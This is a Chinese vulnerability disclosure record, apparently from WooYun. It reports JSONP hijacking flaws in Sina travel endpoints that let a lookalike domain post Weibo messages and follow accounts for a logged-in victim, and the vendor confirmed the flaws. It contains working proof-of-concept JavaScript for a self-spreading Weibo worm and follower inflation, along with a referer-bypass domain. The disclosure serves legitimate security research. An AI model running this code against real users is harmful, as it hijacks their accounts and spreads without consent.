{"id": 84972, "wybug_id": "wooyun-2016-0171499", "wybug_title": "新浪微博JSONP劫持之点我链接开始微博蠕虫+刷粉丝", "wybug_corp": "新浪", "wybug_author": "zhchbin", "wybug_date": "2016-01-20 22:34", "wybug_open_date": "2016-03-05 09:52", "wybug_type": "CSRF", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["类型应用"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-01-20：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-01-21：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-01-31：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-02-10：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-02-20：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-03-05：\t细节向公众公开  简要描述： JSONP劫持，域名是sina.com.cn的子域，就报给新浪吧。放了快一个月，再不发我怕我控制不住真的去玩蠕虫，刷粉丝了。 详细说明：  0x01 发微博在新浪旅游的攻略页面中有个提问的功能，提示“此问题会同步到你的新浪微博”。\nhttp://travel.sina.com.cn/fj_sanming_685-xiangqing-gonglue/\n\n\n具体接口如下：\nhttp://u.travel.sina.com.cn/api-i/qa/sendweibo?content=asdf1&callback=jQuery17206884582478087395_1452354554166&_=1452354673975\n这个接口是JSONP的形式，有检查referer，但是不严格，可以轻松绕过，可以绕过的referer例子：\nhttp://travel.sina.com.cn.zhchbin.xyz/\n0x02 关注有些攻略页面会嵌入一些旅行网的微博，上面有关注功能，比如：\nhttp://travel.sina.com.cn/aolanduo_2998-xiangqing-gonglue/\n具体接口如下：\nhttp://data.travel.sina.com.cn/award/friendships.php?uid=1684037597&times=1453205469390&callback=jQuery172005376373999752104_1453205445886&_=1453205469391\n这个接口也是JSONP，没有任何检查，直接劫持即可。通过这两个接口，我就可以成为网红了应该，劫持发微博蠕虫，同时刷粉丝！   漏洞证明：  登录微博，点我链接：\nhttp://travel.sina.com.cn.zhchbin.xyz/travel_jsonp.html\n测试代码：\n<script type=\"text/javascript\" src=\"http://apps.bdimg.com/libs/jquery/2.1.4/jquery.js\"></script><script>$(function() {  var sendweibo = 'http://u.travel.sina.com.cn/api-i/qa/sendweibo?'  var content = \"这里有好东西，赶紧看，你懂得！http://travel.sina.com.cn.zhchbin.xyz/travel_jsonp.html\"  sendweibo = sendweibo + 'content=' + content + '&_=' + Date.now();  $.ajax({    url: sendweibo,    jsonp: \"callback\",    dataType: \"jsonp\",    success: function(response) {      console.log(response);    }  });  var follow_me = 'http://data.travel.sina.com.cn/award/friendships.php?uid=1904533355&times=' + Date.now();  $.ajax({    url: follow_me,    jsonp: \"callback\",    dataType: \"jsonp\",    success: function(response) {      console.log(response);    }  });});</script>\n   修复方案：  修复JSONP劫持欢迎关注我微博！！http://weibo.com/zhchbin   版权声明：转载请注明来源 zhchbin@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2016-01-21 10:03 厂商回复： 感谢支持，漏洞修复中 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-01-20 22:36 |    \t\tthewind \t\t\t( 普通白帽子  |\t\t\t        Rank:149 漏洞数:37        | 小白……)\t\t \n  前排混眼熟    \n     2016-01-20 22:53 |    \t\tMieless \t\t\t( 实习白帽子  |\t\t\t        Rank:35 漏洞数:10        | 我是来打酱油的。)\t\t \n  唉，就差个橙V认证    \n     2016-01-20 22:59 |    \t\t薄雾 \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:2        | 喜欢交友。喜欢动脑。)\t\t \n  前排挤挤    \n     2016-01-20 23:27 |    \t\tzhchbin \t\t\t( 普通白帽子  |\t\t\t        Rank:115 漏洞数:25        | 要走得再远一些！|但行好事，不问前程)\t\t \n  感谢@xsser 这么快就帮我审核了！！@thewind 你Rank比我高多了，我来混眼熟才对。    \n     2016-01-21 00:12 |    \t\tsqlfeng \t\t\t( 普通白帽子  |\t\t\t        Rank:376 漏洞数:57        | http://weibo.com/fds1986)\t\t \n  这个B装的我给82分，剩下的18分我以666的形式给你    \n     2016-01-21 00:52 |    \t\tMayter \t\t\t( 普通白帽子  |\t\t\t        Rank:153 漏洞数:39        | 笼鸡有食汤锅近，野鹤无粮天地宽.)\t\t \n  6666    \n     2016-01-21 03:59 |    \t\tMengter \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:2        | 太难了.)\t\t \n  前排出售西瓜小板凳瓜子矿泉水，买不起的让一让    \n     2016-01-21 03:59 |    \t\t_Thorns \t\t\t( 普通白帽子  |\t\t\t        Rank:1662 漏洞数:248        | WooYun is the Bigest gay place.  网络工...)\t\t \n  @Mengter 洗洗睡吧    \n     2016-01-21 04:21 |    \t\tMengter \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:2        | 太难了.)\t\t \n  @_Thorns 卖完再睡.    \n     2016-01-21 05:12 |    \t\t_Thorns \t\t\t( 普通白帽子  |\t\t\t        Rank:1662 漏洞数:248        | WooYun is the Bigest gay place.  网络工...)\t\t \n  @Mengter .....    \n     2016-01-21 07:50 |    \t\t火风暴 \t\t\t( 路人 |\t\t\t        Rank:25 漏洞数:5        | 黑夜给了我无情的眼睛让我拿着冷血的剑,策...)\t\t \n  说，你跟呆子不开口啥关系    \n     2016-01-21 07:55 |    \t\t围剿 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:5        | Evil decimal)\t\t \n  666666666    \n     2016-01-21 09:09 |    \t\tzhchbin \t\t\t( 普通白帽子  |\t\t\t        Rank:115 漏洞数:25        | 要走得再远一些！|但行好事，不问前程)\t\t \n  @火风暴 我说我是他小号你信吗？好吧，不能装，我是呆粉！    \n     2016-01-21 09:53 |    \t\t呆子不开口 \t\t\t( 普通白帽子  |\t\t\t        Rank:370 漏洞数:34        | 求各种兼职)\t\t \n  @火风暴 他原来是我小号，后来长大了，翅膀硬了，跑了    \n     2016-01-27 09:24 |    \t\tAnthea \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:2        | 这世上总有另一个我，做着我不敢做的事，过...)\t\t \n  讲真。。你就是缺个女朋友。。所以才老挖这种刷粉儿的洞    \n     2016-01-27 11:24 |    \t\tzhchbin \t\t\t( 普通白帽子  |\t\t\t        Rank:115 漏洞数:25        | 要走得再远一些！|但行好事，不问前程)\t\t \n  @Anthea 我妈都木有催我！！！    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}